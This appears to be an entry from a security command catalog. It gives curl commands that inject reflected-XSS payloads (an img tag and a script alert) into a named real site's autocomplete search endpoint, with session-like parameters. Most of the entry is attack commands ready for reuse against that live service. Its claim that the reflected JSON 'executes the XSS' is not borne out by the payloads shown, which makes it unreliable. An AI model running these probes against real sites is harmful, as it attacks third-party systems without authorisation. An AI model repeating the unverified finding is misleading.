---
data: >-
  curl
  "https://www.udemy.com/autocomplete/search/?cl=EyNkHjsRED4T&displayType=json&cf=ExRONTsRED5COkUCGxAHKV8HaTMPDBFu&count=4&term=%22%3E%3Cimg+src%3D%3E"
tags:
  - xss
  - web
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 0fef1bab-db03-41e3-9cae-d0bd7c3c669f
created_at: '2025-12-14T03:15:27.001Z'
updated_at: '2025-12-14T03:15:27.001Z'
verified: false
validated: true
submitted: true
---
# curl-udemy-autocomplete-search

## Command

```bash
curl "https://www.udemy.com/autocomplete/search/?cl=EyNkHjsRED4T&displayType=json&cf=ExRONTsRED5COkUCGxAHKV8HaTMPDBFu&count=4&term=%22%3E%3Cimg+src%3D%3E"
```

## Description

This curl command queries Udemy's autocomplete search endpoint to trigger a reflected XSS by including a malicious term parameter, demonstrating payload reflection in the JSON response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `term` | URL-encoded search term containing the XSS payload | Yes |
| `cl` | Client identifier (specific to Udemy session) | No |
| `displayType` | Response format (json) | No |
| `cf` | Configuration flags | No |
| `count` | Number of results (e.g., 4) | No |

## Examples

### Basic Usage

```bash
curl "https://www.udemy.com/autocomplete/search/?term=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
```

### Advanced Usage

```bash
curl -v "https://www.udemy.com/autocomplete/search/?cl=EyNkHjsRED4T&displayType=json&cf=ExRONTsRED5COkUCGxAHKV8HaTMPDBFu&count=4&term=%22%3E%3Cimg+src%3D%3E" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

A JSON array of search results with the reflected payload embedded, e.g., {"results": [{"name": "><img src=>"}]} which, when parsed in a browser, executes the XSS.

## Related

- [[Related Procedure|procedures/Trigger-Reflected-XSS-via-Search-Endpoint]]
